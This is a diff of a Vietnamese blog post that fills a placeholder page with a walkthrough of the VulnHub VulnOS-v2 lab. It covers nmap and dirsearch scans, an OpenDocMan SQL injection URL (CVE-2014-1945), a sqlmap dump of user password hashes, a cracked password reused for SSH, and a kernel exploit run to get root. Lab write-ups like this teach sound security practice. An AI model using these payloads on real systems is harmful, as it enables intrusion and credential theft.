@@ -23,17 +23,27 @@
     var NexT = window.NexT || {};
     var CONFIG = {"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","version":"8.1.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
   </script>
-<meta name="description" content="Writing…">
+<meta name="description" content="OverviewLink download: VULNOS: 2Difficulty: EasyĐuỵt moẹ, phải nói là cái bài củ lìn này nhiều trap thực sự, đi mò mẫm mất thời gian vcl mà toàn rabbit hole.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="vulnos-vulnhub">
+<meta property="og:title" content="[VulnHub] VulnOS-v2">
 <meta property="og:url" content="http://example.com/2021/02/01/vulnos-vulnhub/index.html">
 <meta property="og:site_name" content="TARS">
-<meta property="og:description" content="Writing…">
+<meta property="og:description" content="OverviewLink download: VULNOS: 2Difficulty: EasyĐuỵt moẹ, phải nói là cái bài củ lìn này nhiều trap thực sự, đi mò mẫm mất thời gian vcl mà toàn rabbit hole.">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/02/01/vulnos-vulnhub/1.png">
+<meta property="og:image" content="http://example.com/2021/02/01/vulnos-vulnhub/2.png">
+<meta property="og:image" content="http://example.com/2021/02/01/vulnos-vulnhub/3.png">
+<meta property="og:image" content="http://example.com/2021/02/01/vulnos-vulnhub/4.png">
+<meta property="og:image" content="http://example.com/2021/02/01/vulnos-vulnhub/5.png">
+<meta property="og:image" content="http://example.com/2021/02/01/vulnos-vulnhub/6.png">
+<meta property="og:image" content="http://example.com/2021/02/01/vulnos-vulnhub/7.png">
 <meta property="article:published_time" content="2021-02-01T08:40:23.000Z">
-<meta property="article:modified_time" content="2021-02-03T15:29:48.071Z">
+<meta property="article:modified_time" content="2021-02-05T15:57:10.151Z">
 <meta property="article:author" content="minhnq22">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="easy">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/02/01/vulnos-vulnhub/1.png">
 
 
 <link rel="canonical" href="http://example.com/2021/02/01/vulnos-vulnhub/">
@@ -48,7 +58,7 @@
     lang   : 'en'
   };
 </script>
-<title>vulnos-vulnhub | TARS</title>
+<title>[VulnHub] VulnOS-v2 | TARS</title>
   
     <script async src="https://www.googletagmanager.com/gtag/js?id=UA-188223675"></script>
     <script>
@@ -202,7 +212,7 @@
 
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           Table of Contents
@@ -215,6 +225,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-number">1.</span> <span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Information-Gathering"><span class="nav-number">2.</span> <span class="nav-text">Information Gathering</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap"><span class="nav-number">2.1.</span> <span class="nav-text">Nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dirsearch"><span class="nav-number">2.2.</span> <span class="nav-text">Dirsearch</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sqlmap"><span class="nav-number">2.3.</span> <span class="nav-text">Sqlmap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-number">3.</span> <span class="nav-text">Privilege Escalation</span></a></li></ol></div>
         </section>
         <!--/noindex-->
 
@@ -306,7 +317,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          vulnos-vulnhub
+          [VulnHub] VulnOS-v2
         </h1>
 
         <div class="post-meta-container">
@@ -319,6 +330,15 @@
 
       <time title="Created: 2021-02-01 15:40:23" itemprop="dateCreated datePublished" datetime="2021-02-01T15:40:23+07:00">2021-02-01</time>
     </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/VulnHub/" itemprop="url" rel="index"><span itemprop="name">VulnHub</span></a>
+        </span>
+    </span>
 
   
     <span class="post-meta-item" title="Reading time">
@@ -326,7 +346,7 @@
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>2 mins.</span>
+      <span>5 mins.</span>
     </span>
 </div>
 
@@ -337,59 +357,115 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <p>Writing…</p>
+        <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Link download: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/vulnos-2,147/">VULNOS: 2</a><br>Difficulty: Easy<br>Đuỵt moẹ, phải nói là cái bài củ lìn này nhiều trap thực sự, đi mò mẫm mất thời gian vcl mà toàn rabbit hole.</p>
 <a id="more"></a>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -sn -v 10.10.10.102-105
-Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-03 15:39 +07
-Initiating Ping Scan at 15:39
-Scanning 4 hosts [2 ports&#x2F;host]
-Completed Ping Scan at 15:39, 1.20s elapsed (4 total hosts)
-Initiating Parallel DNS resolution of 1 host. at 15:39
-Completed Parallel DNS resolution of 1 host. at 15:39, 0.04s elapsed
-Nmap scan report for 10.10.10.102 [host down]
-Nmap scan report for 10.10.10.103
-Host is up (0.00058s latency).
-Nmap scan report for 10.10.10.104 [host down]
-Nmap scan report for 10.10.10.105 [host down]
-Read data files from: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;share&#x2F;nmap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -p- 10.10.10.103 --min-rate 3000
-Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-03 15:39 +07
-Nmap scan report for 10.10.10.103
-Host is up (0.00013s latency).
-Not shown: 65532 closed ports
-PORT     STATE SERVICE
-22&#x2F;tcp   open  ssh
-80&#x2F;tcp   open  http
-6667&#x2F;tcp open  irc
+<h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ nmap -sn -v <span class="token number">10.10</span>.10.102-105
+Starting Nmap <span class="token number">7.91</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2021</span>-02-03 <span class="token number">15</span>:39 +07
+Initiating Ping Scan at <span class="token number">15</span>:39
+Scanning <span class="token number">4</span> hosts <span class="token punctuation">[</span><span class="token number">2</span> ports/host<span class="token punctuation">]</span>
+Completed Ping Scan at <span class="token number">15</span>:39, <span class="token number">1</span>.20s elapsed <span class="token punctuation">(</span><span class="token number">4</span> total hosts<span class="token punctuation">)</span>
+Initiating Parallel DNS resolution of <span class="token number">1</span> host. at <span class="token number">15</span>:39
+Completed Parallel DNS resolution of <span class="token number">1</span> host. at <span class="token number">15</span>:39, <span class="token number">0</span>.04s elapsed
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.102 <span class="token punctuation">[</span>host down<span class="token punctuation">]</span>
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.103
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00058s latency<span class="token punctuation">)</span>.
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.104 <span class="token punctuation">[</span>host down<span class="token punctuation">]</span>
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.105 <span class="token punctuation">[</span>host down<span class="token punctuation">]</span>
+Read data files from: /usr/bin/<span class="token punctuation">..</span>/share/nmap
 
-Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -p 22,80,6667 -A 10.10.10.103   
-Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-03 15:41 +07
-Nmap scan report for 10.10.10.103
-Host is up (0.00064s latency).
+$ nmap -p- <span class="token number">10.10</span>.10.103 --min-rate <span class="token number">3000</span>
+Starting Nmap <span class="token number">7.91</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2021</span>-02-03 <span class="token number">15</span>:39 +07
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.103
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00013s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">65532</span> closed ports
+PORT     STATE SERVICE
+<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>
+<span class="token number">80</span>/tcp   <span class="token function">open</span>  http
+<span class="token number">6667</span>/tcp <span class="token function">open</span>  irc
+
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">1.05</span> seconds
+
+$ nmap -p <span class="token number">22,80</span>,6667 -A <span class="token number">10.10</span>.10.103   
+Starting Nmap <span class="token number">7.91</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2021</span>-02-03 <span class="token number">15</span>:41 +07
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.103
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00064s latency<span class="token punctuation">)</span>.
 
 PORT     STATE SERVICE VERSION
-22&#x2F;tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)
-|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)
-|   256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)
-|_  256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 (ED25519)
-80&#x2F;tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
-|_http-server-header: Apache&#x2F;2.4.7 (Ubuntu)
-|_http-title: VulnOSv2
-6667&#x2F;tcp open  irc     ngircd
-Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel
+<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">6.6</span>.1p1 Ubuntu 2ubuntu2.6 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh-hostkey: 
+<span class="token operator">|</span>   <span class="token number">1024</span> f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b <span class="token punctuation">(</span>DSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>   <span class="token number">2048</span> ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>   <span class="token number">256</span> ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">71</span>:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
+<span class="token number">80</span>/tcp   <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.7 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
+<span class="token operator">|</span>_http-server-header: Apache/2.4.7 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
+<span class="token operator">|</span>_http-title: VulnOSv2
+<span class="token number">6667</span>/tcp <span class="token function">open</span>  irc     ngircd
+Service Info: Host: irc.example.net<span class="token punctuation">;</span> OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
-Nmap done: 1 IP address (1 host up) scanned in 18.66 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">available databases [6]:
-[*] drupal7
-[*] information_schema
-[*] jabcd0cs
-[*] mysql
-[*] performance_schema
-[*] phpmyadmin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">18.66</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Có cái cổng 6667 chạy dịch vụ đéo gì kia, <em>irc</em>, wtf!? Không vội cắm mặt vào cái này, chả đi đến đâu đâu, tôi thử rồi :/<br>Tập trung vào cái http server của nó đã.<br><img src="1.png"><br>Nhìn cái mặt tiền web site này u tối như chợ đen (đen đúng nghĩa đen). <em>Enumerate</em> cái URL này để kiếm file ẩn.</p>
+<h3 id="Dirsearch"><a href="#Dirsearch" class="headerlink" title="Dirsearch"></a>Dirsearch</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token punctuation">..</span>.bla<span class="token punctuation">..</span>.bla<span class="token punctuation">..</span>.bla<span class="token punctuation">..</span>.
+<span class="token punctuation">[</span><span class="token number">22</span>:05:27<span class="token punctuation">]</span> <span class="token number">200</span> -   10KB - /jabc/includes/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:27<span class="token punctuation">]</span> <span class="token number">200</span> -  117KB - /jabc/includes/bootstrap.inc
+<span class="token punctuation">[</span><span class="token number">22</span>:05:27<span class="token punctuation">]</span> <span class="token number">200</span> -    9KB - /jabc/index.php
+<span class="token punctuation">[</span><span class="token number">22</span>:05:27<span class="token punctuation">]</span> <span class="token number">200</span> -    3KB - /jabc/install.php
+<span class="token punctuation">[</span><span class="token number">22</span>:05:28<span class="token punctuation">]</span> <span class="token number">301</span> -  315B  - /jabc/misc  -<span class="token operator">></span>  http://10.10.10.103/jabc/misc/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:28<span class="token punctuation">]</span> <span class="token number">301</span> -  318B  - /jabc/modules  -<span class="token operator">></span>  http://10.10.10.103/jabc/modules/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:28<span class="token punctuation">]</span> <span class="token number">200</span> -    9KB - /jabc/modules/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:31<span class="token punctuation">]</span> <span class="token number">301</span> -  319B  - /jabc/profiles  -<span class="token operator">></span>  http://10.10.10.103/jabc/profiles/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:31<span class="token punctuation">]</span> <span class="token number">200</span> -  743B  - /jabc/profiles/standard/standard.info
+<span class="token punctuation">[</span><span class="token number">22</span>:05:31<span class="token punctuation">]</span> <span class="token number">200</span> -  278B  - /jabc/profiles/testing/testing.info
+<span class="token punctuation">[</span><span class="token number">22</span>:05:31<span class="token punctuation">]</span> <span class="token number">200</span> -  271B  - /jabc/profiles/minimal/minimal.info
+<span class="token punctuation">[</span><span class="token number">22</span>:05:31<span class="token punctuation">]</span> <span class="token number">200</span> -    2KB - /jabc/robots.txt
+<span class="token punctuation">[</span><span class="token number">22</span>:05:32<span class="token punctuation">]</span> <span class="token number">301</span> -  318B  - /jabc/scripts  -<span class="token operator">></span>  http://10.10.10.103/jabc/scripts/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:32<span class="token punctuation">]</span> <span class="token number">200</span> -  949B  - /jabc/scripts/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:32<span class="token punctuation">]</span> <span class="token number">301</span> -  316B  - /jabc/sites  -<span class="token operator">></span>  http://10.10.10.103/jabc/sites/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:33<span class="token punctuation">]</span> <span class="token number">301</span> -  320B  - /jabc/templates  -<span class="token operator">></span>  http://10.10.10.103/jabc/templates/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:33<span class="token punctuation">]</span> <span class="token number">200</span> -  976B  - /jabc/templates/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:34<span class="token punctuation">]</span> <span class="token number">301</span> -  317B  - /jabc/themes  -<span class="token operator">></span>  http://10.10.10.103/jabc/themes/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:34<span class="token punctuation">]</span> <span class="token number">200</span> -    2KB - /jabc/themes/
+<span class="token punctuation">[</span><span class="token number">22</span>:05:34<span class="token punctuation">]</span> <span class="token number">403</span> -    4KB - /jabc/update.php
+<span class="token punctuation">[</span><span class="token number">22</span>:05:35<span class="token punctuation">]</span> <span class="token number">200</span> -   42B  - /jabc/xmlrpc.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Nền tảng Drupal, phiên bản 7.26, kiếm được ở đâu thì ở đây nhé.<br><em>/jabc/profiles/standard/standard.info</em></p>
+<pre class="line-numbers language-none"><code class="language-none">Information added by Drupal.org packaging script on 2014-01-15
+version &#x3D; &quot;7.26&quot;
+project &#x3D; &quot;drupal&quot;
+datestamp &#x3D; &quot;1389815930&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Cái đìn địz! Cái chỗ file/folder này khiến tôi mất thời gian thực sự nhiều, toàn trap hết, đây là kết luận của tôi sau 15 phút mò mẫm hết cái đống này và chả kiếm chác thêm được gì có giá trị. Quay trở lại với mặt tiền đen xì xì kia, có đoạn này.<br><img src="2.png"><br>Cái trò nền đen chữ đen này xưa như trái đất rồi nhé tml!<br>Login vào một web site khác với tài khoản và mật khẩu là guest/guest.<br><em>Cảm thấy tiếc thời gian vào cái đống file enumerate vcl</em><br><img src="3.png"><br>Để ý thấy OpenDocMan v1.2.7. Search lỗi về thằng này ngay và luôn.<br><img src="4.png"><br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/32075">https://www.exploit-db.com/exploits/32075</a></p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">1</span><span class="token punctuation">)</span> SQL Injection <span class="token keyword">in</span> OpenDocMan: CVE-2014-1945
+
+The vulnerability exists due to insufficient validation of <span class="token string">"add_value"</span> HTTP GET parameter <span class="token keyword">in</span> <span class="token string">"/ajax_udf.php"</span> script. A remote unauthenticated attacker can execute arbitrary SQL commands <span class="token keyword">in</span> application's database.
+
+The exploitation example below displays version of the MySQL server:
+
+http://<span class="token punctuation">[</span>host<span class="token punctuation">]</span>/ajax_udf.php?q<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">add_value</span><span class="token operator">=</span>odm_user%20UNION%20SELECT%201,v
+ersion%28%29,3,4,5,6,7,8,9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Rõ ràng =)) ném thằng vào Sqlmap chứ còn gì nữa.</p>
+<h3 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Database: jabcd0cs                                                                                                       
+Table: odm_user
+<span class="token punctuation">[</span><span class="token number">3</span> entries<span class="token punctuation">]</span>
++----+--------------------+-------------+------------------------------------------+----------+-----------+------------+------------+---------------+
+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> Email              <span class="token operator">|</span> phone       <span class="token operator">|</span> password                                 <span class="token operator">|</span> username <span class="token operator">|</span> last_name <span class="token operator">|</span> department <span class="token operator">|</span> first_name <span class="token operator">|</span> pw_reset_code <span class="token operator">|</span>
++----+--------------------+-------------+------------------------------------------+----------+-----------+------------+------------+---------------+
+<span class="token operator">|</span> <span class="token number">1</span>  <span class="token operator">|</span> webmin@example.com <span class="token operator">|</span> <span class="token number">5555551212</span>  <span class="token operator">|</span> b78aae356709f8c31118ea613980954b         <span class="token operator">|</span> webmin   <span class="token operator">|</span> min       <span class="token operator">|</span> <span class="token number">2</span>          <span class="token operator">|</span> web        <span class="token operator">|</span> <span class="token operator">&lt;</span>blank<span class="token operator">></span>       <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token number">2</span>  <span class="token operator">|</span> guest@example.com  <span class="token operator">|</span> <span class="token number">555</span> <span class="token number">5555555</span> <span class="token operator">|</span> 084e0343a0486ff05530df6c705c8bb4 <span class="token punctuation">(</span>guest<span class="token punctuation">)</span> <span class="token operator">|</span> guest    <span class="token operator">|</span> guest     <span class="token operator">|</span> <span class="token number">2</span>          <span class="token operator">|</span> guest      <span class="token operator">|</span> NULL          <span class="token operator">|</span>
++----+--------------------+-------------+------------------------------------------+----------+-----------+------------+------------+---------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="5.png"><br><code>b78aae356709f8c31118ea613980954b:webmin1980</code><br>Đến đây lại mất thêm thời gian để mò mẫm xem admin có làm gì được thêm không, có upload file, enable extention file để upload shell bla bla… đều đéo được :)<br>Một kinh nghiệm được rút ra khi tôi làm bài Writeup-HackTheBox, đó là tài khoản đăng nhập trên Http server hoàn toàn có thể đăng nhập được cả trên SSH, vì sao? Vì con người ấy mà, để tránh phải nhớ nhiều account trên một hệ thống, họ thường có xu hướng để cmn giống hệt nhau.<br>Xét cho cùng, thì con người vẫn luôn là điểm yếu nhất của hệ thống.<br><img src="6.png"></p>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>Vì có được mật khẩu của user webmin, nên tôi không ngại khoản chạy lệnh sudo, chỉ là sudoer đéo cho tôi vào danh sách thôi :v<br>Để ý thấy phiên bản kernel hệ điều hành đang chạy là 3.13, hàng cổ đấy, và tôi biết thừa là nó dính lỗi leo quyền vì tôi từng gặp rồi :)))<br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/33824">https://www.exploit-db.com/exploits/33824</a><br><img src="7.png"></p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">webmin@VulnOSv2:~/duma$ gcc <span class="token number">37292</span>.c -o i_am_groot
+webmin@VulnOSv2:~/duma$ ./i_am_groot 
+spawning threads
+<span class="token function">mount</span> <span class="token comment">#1</span>
+<span class="token function">mount</span> <span class="token comment">#2</span>
+child threads <span class="token keyword">done</span>
+/etc/ld.so.preload created
+creating shared library
+<span class="token comment"># id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,1001<span class="token punctuation">(</span>webmin<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Done!</p>
+
     </div>
 
     
@@ -397,6 +473,10 @@ Nmap done: 1 IP address (1 host up) scanned in 18.66 seconds<span aria-hidden="t
     
 
     <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
+              <a href="/tags/easy/" rel="tag"># easy</a>
+          </div>
 
         
   <div class="post-widgets">
